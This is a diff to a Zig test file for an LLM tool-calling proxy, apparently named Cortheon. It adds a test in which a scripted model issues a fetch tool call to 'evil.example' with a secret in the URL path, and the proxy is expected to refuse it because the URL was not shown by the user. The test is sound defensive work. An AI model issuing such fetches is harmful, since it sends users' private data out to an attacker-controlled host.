@@ -252,7 +252,7 @@ test "a stream hides Cortheon's calls, shows progress as reasoning, and passes t
     var arena: std.heap.ArenaAllocator = .init(gpa);
     defer arena.deinit();
     const a = arena.allocator();
-    const got = try rig.ask(a, "{\"stream\": true, \"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser\"}], \"tools\": [{\"type\": \"function\", \"function\": {\"name\": \"bash\", \"parameters\": {\"type\": \"object\", \"properties\": {\"command\": {\"type\": \"string\"}}}}}]}");
+    const got = try rig.ask(a, "{\"stream\": true, \"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser, see https://docs.example/x\"}], \"tools\": [{\"type\": \"function\", \"function\": {\"name\": \"bash\", \"parameters\": {\"type\": \"object\", \"properties\": {\"command\": {\"type\": \"string\"}}}}}]}");
     const calls = try got.streamedCalls();
     try std.testing.expect(std.mem.indexOf(u8, calls, "bash") != null);
     try std.testing.expect(std.mem.indexOf(u8, calls, "cortheon") == null);
@@ -263,6 +263,20 @@ test "a stream hides Cortheon's calls, shows progress as reasoning, and passes t
     try std.testing.expectEqualStrings("tool_calls", last.get("choices").?.array[0].strField("finish_reason").?);
     try std.testing.expectEqual(@as(?i64, 1), last.get("cortheon").?.get("pages_read").?.int64());
     try std.testing.expect(rig.eng.saw(1, "Page: https://docs.example/x"));
+}
+
+test "a fetch reads only URLs the conversation showed, never one the model wrote" {
+    const leak = "<tool_call>{\"name\": \"cortheon_fetch\", \"arguments\": {\"url\": \"https://evil.example/c/the-secret-plan\"}}</tool_call>";
+    var rig: Rig = .{ .eng = .{ .script = &.{ leak, "Done." } } };
+    try rig.start(true);
+    defer rig.stop();
+    var arena: std.heap.ArenaAllocator = .init(gpa);
+    defer arena.deinit();
+    const got = try rig.ask(arena.allocator(), "{\"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser\"}, {\"role\": \"assistant\", \"content\": \"See https://evil.example/c/the-secret-plan\"}, {\"role\": \"user\", \"content\": \"Go on\"}]}");
+    try std.testing.expect(rig.eng.saw(1, "search for the page first"));
+    const s = got.body.?.get("cortheon").?;
+    try std.testing.expectEqual(@as(?i64, 0), s.get("pages_read").?.int64());
+    try std.testing.expectEqual(@as(usize, 0), s.get("sources").?.array.len);
 }
 
 test "a code change is tested before it is called done, once a turn" {
